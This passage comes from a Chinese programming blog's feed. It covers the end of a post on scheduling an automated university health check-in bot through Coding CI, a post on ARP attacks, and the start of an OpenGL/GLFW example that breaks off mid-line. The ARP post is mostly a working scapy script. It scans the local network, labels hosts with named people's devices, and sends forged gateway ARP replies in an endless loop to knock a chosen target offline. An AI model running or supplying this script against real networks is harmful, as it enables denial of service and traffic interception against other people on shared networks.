     <span class="string">&#x27;lang&#x27;</span>: <span class="string">&#x27;zh&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        req = self.sessions.post(URL_MAP[<span class="string">&#x27;DOACTION&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class="line">        <span class="keyword">if</span> req.json()[<span class="string">&#x27;ecode&#x27;</span>] == <span class="string">&#x27;SUCCEED&#x27;</span>:</span><br><span class="line">            self.logger.info(<span class="string">&#x27;健康打卡填报阶段, 成功!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;健康打卡填报阶段, 失败!&#x27;</span>)</span><br><span class="line">        self.check()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @retry(stop_max_attempt_number=3)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;打卡完毕后复检&quot;&quot;&quot;</span></span><br><span class="line">        req = self.sessions.get(URL_MAP[<span class="string">&#x27;CHECK&#x27;</span>], headers=HEADERS)</span><br><span class="line">        last_time = req.json()[<span class="string">&#x27;entities&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;update&#x27;</span>]</span><br><span class="line">        local_time = time.strftime(<span class="string">&quot;%Y/%m/%d %H:%M:%S&quot;</span>, time.localtime(last_time))</span><br><span class="line">        update = round(time.time()) - last_time</span><br><span class="line">        <span class="keyword">if</span> update &gt; <span class="number">5</span>:</span><br><span class="line">            self.logger.error(<span class="string">&#x27;上次打卡完成于%ss前,打卡可能未成功!&#x27;</span>, update)</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;打卡复检状态异常!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.logger.info(<span class="string">&#x27;打卡完成于%s&#x27;</span>, local_time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    BOT = Bot(<span class="string">&#x27;config.ini&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h1><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>登录<a href="https://e.coding.net/login">Coding</a>， 进入团队，切换到项目（左边栏点击’项目’），创建项目，选择DevOps项目。</p><h2 id="创建代码仓库"><a href="#创建代码仓库" class="headerlink" title="创建代码仓库"></a>创建代码仓库</h2><p>切换到代码仓库，新建代码仓库，勾选启用READEME.md文件初始化项目，取消启用代码扫描，点击确认。<br><img data-src="https://cdn.file.todest.cn/blog/pic/20201205164547.png" alt=""></p><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><p>新建文件main.py，将完整代码粘贴进去，点击提交并直接确认。<br><img data-src="https://cdn.file.todest.cn/blog/pic/20201205164816.png" alt=""><br>点击上方浏览返回文件根目录，再次创建文件Jenkinsfile (注: 无文件名后缀，请不要自行发挥)，粘贴下面代码并提交，并重复此步骤将修改好的config.ini上传。<br><figure class="highlight yml"><figcaption><span>Jenkinsfile</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pipeline</span> &#123;</span><br><span class="line">  <span class="string">agent</span> &#123;</span><br><span class="line">    <span class="string">any</span> &#123;</span><br><span class="line">      <span class="string">reuseNode</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="string">stages</span> &#123;</span><br><span class="line">    <span class="string">stage(&#x27;检出&#x27;)</span> &#123;</span><br><span class="line">      <span class="string">steps</span> &#123;</span><br><span class="line">        <span class="string">checkout(</span>[</span><br><span class="line">          <span class="string">$class:</span> <span class="string">&#x27;GitSCM&#x27;</span>,</span><br><span class="line">          <span class="attr">branches:</span> [[<span class="attr">name:</span> <span class="string">env.GIT_BUILD_REF</span>]],</span><br><span class="line">          <span class="attr">userRemoteConfigs:</span> [[</span><br><span class="line">            <span class="attr">url:</span> <span class="string">env.GIT_REPO_URL</span>,</span><br><span class="line">            <span class="attr">credentialsId:</span> <span class="string">env.CREDENTIALS_ID</span></span><br><span class="line">          ]]]<span class="string">)</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="string">stage(&#x27;安装依赖&#x27;)</span> &#123;</span><br><span class="line">        <span class="string">steps</span> &#123;</span><br><span class="line">          <span class="string">sh</span> <span class="string">&#x27;&#x27;</span><span class="string">&#x27;pip3 install --upgrade pip</span></span><br><span class="line"><span class="string">pip3 install setuptools</span></span><br><span class="line"><span class="string">pip3 install requests</span></span><br><span class="line"><span class="string">pip3 install bs4</span></span><br><span class="line"><span class="string">pip3 install configparser</span></span><br><span class="line"><span class="string">pip3 install retrying&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="string">stage(&#x27;运行&#x27;)</span> &#123;</span><br><span class="line">        <span class="string">steps</span> &#123;</span><br><span class="line">          <span class="string">sh</span> <span class="string">&#x27;python3 main.py&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><h2 id="创建构建计划"><a href="#创建构建计划" class="headerlink" title="创建构建计划"></a>创建构建计划</h2><p>切换到持续集成-&gt;构建计划，创建构建计划，翻到最下面选择自定义构建过程，代码仓库选择此代码仓库，配置来源勾选上使用代码库中的Jenkinsfile，点击确认。<br><img data-src="https://cdn.file.todest.cn/blog/pic/20201205165857.png" alt=""><br>保存并构建，确认，立即构建，等待构建成功。<br><img data-src="https://cdn.file.todest.cn/blog/pic/20201205170328.png" alt=""></p><h2 id="设置定时触发"><a href="#设置定时触发" class="headerlink" title="设置定时触发"></a>设置定时触发</h2><p>点击右上角的设置修改构建计划的配置，切换到触发规则，添加定时触发，设置好触发的时期时间点击确认。<br><img data-src="https://cdn.file.todest.cn/blog/pic/20201205170919.png" alt=""></p><h2 id="完成并查看"><a href="#完成并查看" class="headerlink" title="完成并查看"></a>完成并查看</h2><p>如果到了这里还没有出现错误的话，那么就基本没问题了，可以在项目概览查看每次定时触发情况。<br><img data-src="https://cdn.file.todest.cn/blog/pic/20201205171438.png" alt=""><br>也可以点击任务ID查看执行日志。<br><img data-src="https://cdn.file.todest.cn/blog/pic/20201205171840.png" alt=""><br>最后，也可以前往<a href="https://ehall.hpu.edu.cn/taskcenter/workflow/done">学校官网</a>查看打卡情况。</p><h2 id="邮件通知"><a href="#邮件通知" class="headerlink" title="邮件通知"></a>邮件通知</h2><p>一般来说，以目前最新的代码，如果构建失败则打卡失败，所以添加构建失败后邮件提醒还是很有必要的。<br>如果想要构建失败后邮件通知的话，需要在个人账户设置-&gt;提醒设置里面开启持续集成（构建）邮件提醒。<br><img data-src="https://cdn.file.todest.cn/blog/pic/20201207181947.png" alt=""><br>并且需要在个人账户设置-&gt;邮箱设置添加想要接收邮件的邮箱并验证邮箱。<br><img data-src="https://cdn.file.todest.cn/blog/pic/20201207182447.png" alt=""><br>同时，在构建计划设置-&gt;通知提醒里面添加成员为自己并修改通知事件为仅失败。<br><img data-src="https://cdn.file.todest.cn/blog/pic/20201207182104.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;自动健康打卡(逃&lt;/p&gt;
&lt;p&gt;建议使用Coding定时构建，强烈不推荐使用国外服务器，包括github action。&lt;br&gt;&lt;strong&gt;因当天打卡系统异常造成无法打卡时，需等待打卡系统正常后自行打卡或手动触发构建计划。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文档以及代码可能会不定时更新，修复和优化，部署成功的能不能在下面留言告诉一下，且留意本文章是否更新，最后更新时间可以看最上方。&lt;/strong&gt;&lt;br&gt;</summary>
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/"/>
    
    
    <category term="Python" scheme="https://blog.todest.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>ARP攻击</title>
    <link href="https://blog.todest.cn/post/b286d8f1/"/>
    <id>https://blog.todest.cn/post/b286d8f1/</id>
    <published>2020-10-05T12:35:05.000Z</published>
    <updated>2020-10-05T13:19:16.486Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>攻击者向局域网特定网络设备持续的发送ARP欺骗数据包，对该网络设备进行网关欺骗，使其认为网关为攻击者设备，如果攻击者不对被攻击者的网络请求进行处理的话，会造成被攻击者断网。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>inet为一个列表，存储发起ARP攻击要使用的网卡，分别存储网卡名称和网卡MAC地址，net为当前选中网卡序号。<br>host为一个备注字典表，键，值分别对应MAC地址和备注。<br><a id="more"></a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">inet = [</span><br><span class="line">    [<span class="string">&quot;Intel(R) Dual Band Wireless-AC 3165&quot;</span>, <span class="string">&quot;7C:67:A2:F1:9D:2A&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;802.11n USB Wireless LAN Card&quot;</span>, <span class="string">&quot;70:F1:1C:04:8A:54&quot;</span>]</span><br><span class="line">]</span><br><span class="line">host = &#123;</span><br><span class="line">    <span class="string">&quot;60:14:b3:ad:85:7d&quot;</span>: <span class="string">&quot;LiuQI&#x27;s PC-eth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;50:a0:09:d1:fb:65&quot;</span>: <span class="string">&quot;MiAi Sound Box&quot;</span>,</span><br><span class="line">    <span class="string">&quot;04:4f:4c:8e:dc:b8&quot;</span>: <span class="string">&quot;LiuQi&#x27;s Honor 9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;f4:30:b9:a6:0f:76&quot;</span>: <span class="string">&quot;Unkown&quot;</span>,</span><br><span class="line">    <span class="string">&quot;54:e1:ad:7c:0b:53&quot;</span>: <span class="string">&quot;ZhiHao&#x27;s PC-eth&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">net = <span class="number">0</span></span><br><span class="line">wifi = inet[net][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> os.popen(<span class="string">&#x27;route print&#x27;</span>):</span><br><span class="line">    s = line.strip()</span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">&#x27;0.0.0.0&#x27;</span>):</span><br><span class="line">        slist = s.split()</span><br><span class="line">        ip = slist[<span class="number">3</span>]</span><br><span class="line">        gw = slist[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;GW：&#x27;</span>, gw)</span><br><span class="line">print(<span class="string">&#x27;IP：&#x27;</span>, ip)</span><br><span class="line">tnet = gw + <span class="string">&#x27;/24&#x27;</span></span><br><span class="line">p = Ether(dst=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>) / ARP(pdst=tnet)</span><br><span class="line">ans, unans = srp(p, iface=wifi, timeout=<span class="number">5</span>, verbose=<span class="number">0</span>)</span><br><span class="line">print(<span class="string">&quot;Total %d Host：&quot;</span> % len(ans))</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> s, r <span class="keyword">in</span> ans:</span><br><span class="line">    result.append([r[ARP].psrc, r[ARP].hwsrc])</span><br><span class="line">result.sort()</span><br><span class="line"><span class="keyword">for</span> index, (ip, mac) <span class="keyword">in</span> enumerate(result):</span><br><span class="line">    print(index + <span class="number">1</span>, <span class="string">&quot;: &quot;</span>, ip, <span class="string">&quot;\t----&gt;\t&quot;</span>, mac, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> host.get(mac) == <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">&quot; ......&quot;</span>, host[mac])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print()</span><br><span class="line">target = int(input(<span class="string">&quot;Target：&quot;</span>)) - <span class="number">1</span></span><br><span class="line">target = result[target][<span class="number">0</span>]</span><br><span class="line">p1 = Ether(dst=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>, src=inet[net][<span class="number">1</span>]) / ARP(pdst=target, psrc=gw)</span><br><span class="line">print(<span class="string">&quot;Processing......&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sendp(p1, verbose=<span class="number">0</span>)</span><br><span class="line">    time.sleep(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;攻击者向局域网特定网络设备持续的发送ARP欺骗数据包，对该网络设备进行网关欺骗，使其认为网关为攻击者设备，如果攻击者不对被攻击者的网络请求进行处理的话，会造成被攻击者断网。&lt;/p&gt;
&lt;h1 id=&quot;代码&quot;&gt;&lt;a href=&quot;#代码&quot; class=&quot;headerlink&quot; title=&quot;代码&quot;&gt;&lt;/a&gt;代码&lt;/h1&gt;&lt;p&gt;inet为一个列表，存储发起ARP攻击要使用的网卡，分别存储网卡名称和网卡MAC地址，net为当前选中网卡序号。&lt;br&gt;host为一个备注字典表，键，值分别对应MAC地址和备注。&lt;br&gt;</summary>
    
    
    
    <category term="计算机网络" scheme="https://blog.todest.cn/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="Python" scheme="https://blog.todest.cn/tags/Python/"/>
    
    <category term="ARP" scheme="https://blog.todest.cn/tags/ARP/"/>
    
  </entry>
  
  <entry>
    <title>GLFW</title>
    <link href="https://blog.todest.cn/post/d2be7e8/"/>
    <id>https://blog.todest.cn/post/d2be7e8/</id>
    <published>2020-05-19T08:07:05.000Z</published>
    <updated>2020-05-19T08:10:51.850Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;glad/glad.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;GLFW/glfw3.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">framebuffer_size_callback</span><span class="params">(GLFWwindow* window, <span class="keyword">int</span> width, <span class="keyword">int</span> height)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">processInput</span><span class="params">(GLFWwindow* window)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> SCR_WIDTH = <span class="number">800</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> SCR_HEIGHT = <span class="number">600</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* vertexShaderSource = <span class="string">&quot;#version 460 core\n&quot;</span></span><br><span class="line"><span class="string">&quot;layout (location = 0) in vec3 aPos;\n&quot;</span></span><br><span class="line"><span class="string">&quot;void main()\n&quot;</span></span><br><span class="line"><span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line"><span class="string">&quot;   gl_Position = vec4(aPos.x, aPos.y, aPos.z, 1.0);\n&quot;</span></span><br><span class="line"><span class="string">&quot;&#125;\0&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* fragmentShaderSource = <span class="string">&quot;#version 460 core\n&quot;</span></span><br><span class="line"><span class="string">&quot;out vec4 FragColor;\n&quot;</span></span><br><span class="line"><span class="string">&quot;void main()\n&quot;</span></span><br><span class="line"><span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line"><span class="string">&quot;   FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\n&quot;</span></span><br><span class="line"><span class="string">&quot;&#125;\n\0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// glfw: 初始化和配置</span></span><br><span class="line">    <span class="comment">// ------------------------------</span></span><br><span class="line">    glfwInit();</span><br><span class="line">    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, <span class="number">4</span>);</span><br><span class="line">    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, <span class="number">6</span>);</span><br><span class="line">    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// glfw: Mac OS X 系统需配置以下代码</span></span><br><span class="line">    <span class="comment">// ------------------------------</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// glfw 窗口创建</span></span><br><span class="line">    <span class="comment">// --------------------</span></span><br><span class="line">    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, <span class="string">&quot;LearnOpenGL&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (window == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Failed to create GLFW window&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        glfwTerminate();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    glfwMakeContextCurrent(window);</span><br><span class="line">    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// glad: 初始化Glad，加载所有OpenGL函数指针</span></span><br><span class="line">    <span class="comment">// ---------------------------------------</span></span><br><span class="line">    <span class="keyword">if</span> (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Failed to initialize GLAD&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建着色器</span></span><br><span class="line">    <span class="comment">// ------------------------------------</span></span><br><span class="line">    <span class="comment">// 顶点着色器</span></span><br><span class="line">    <span class="keyword">int</span> vertexShader = glCreateShader(GL_VERTEX_SHADER);</span><br><span class="line">    glShaderSource(vertexShader, <span class="number">1</span>, &amp;vertexShaderSource, <span class="literal">NULL</span>);</span><br><span class="line">    glCompileShader(vertexShader);</span><br><span class="line">    <span class="comment">// 检查着色器编译错误</span></span><br><span class="line">    <span class="keyword">int</span> success;</span><br><span class="line">    <span class="keyword">char</span> infoLog[<span class="number">512</span>];</span><br><span class="line">    glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &amp;success);</span><br><span class="line">    <span class="keyword">if</span> (!success)</span><br><span class="line">    &#123;</span><br><span class="line">        glGetShaderInfoLog(vertexShader, <span class="number">512</span>, <span class="literal">NULL</span>, infoLog);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ERROR::SHADER::VERTEX::COMPILATION_FAILED\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 片段着色器</span></span><br><span class="line">    <span class="keyword">int</span> fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);</span><br><span class="line">    glShaderSource(fragmentShader, <span class="number">1</span>, &amp;fragmentShaderSource, <span class="literal">NULL</span>);</span><br><span class="line">    glCompileShader(fragmentShader);</span><br><span class="line">    <span class="comment">// 检查片段着色器编译错误</span></span><br><span class="line">    glGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &amp;success);</span><br><span class="line">    <span class="keyword">if</span> (!success)</span><br><span class="line">    &#123;</span><br><span class="line">        glGetShaderInfoLog(fragmentShader, <span class="number">512</span>, <span class="literal">NULL</span>, infoLog);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 连接着色器</span></span><br><span class="line">    <span class="keyword">int</span> shaderProgram = glCreateProgram();</span><br><span class="line">    glAttachShader(shaderProgram, vertexShader);</span><br><span class="line">    glAttachShader(shaderProgram, fragmentShader);</span><br><span class="line">    glLinkProgram(shaderProgram);</span><br><span class="line">    <span class="comment">// 检查连接错误</span></span><br><span class="line">    glGetProgramiv(shaderProgram, GL_LINK_STATUS, &amp;success);</span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        glGetProgramInfoLog(shaderProgram, <span class="number">512</span>, <span class="literal">NULL</span>, infoLog);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ERROR::SHADER::PROGRAM::LINKING_FAILED\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    glDeleteShader(vertexShader);</span><br><span class="line">    glDeleteShader(fragmentShader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置顶点数据（和缓冲区）并配置顶点属性。</span></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">float</span> vertices[] = &#123;</span><br><span class="line">        <span class="number">0.5f</span>, <span class="number">0.5f</span>, <span class="number">0.0f</span>,   <span class="comment">// 右上角</span></span><br><span class="line">        <span class="number">0.5f</span>, <span class="number">-0.5f</span>, <span class="number">0.0f</span>,  <span class="comment">// 右下角</span></span><br><span class="line">        <span class="number">-0.5f</span>, <span class="number">-0.5f</span>, <span class="number">0.0f</span>, <span class="comment">// 左下角</span></span><br><span class="line">        <span class="number">-0.5f</span>, <span class="number">0.5f</span>, <span class="number">0.0f</span>   <span class="comment">// 左上角</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> 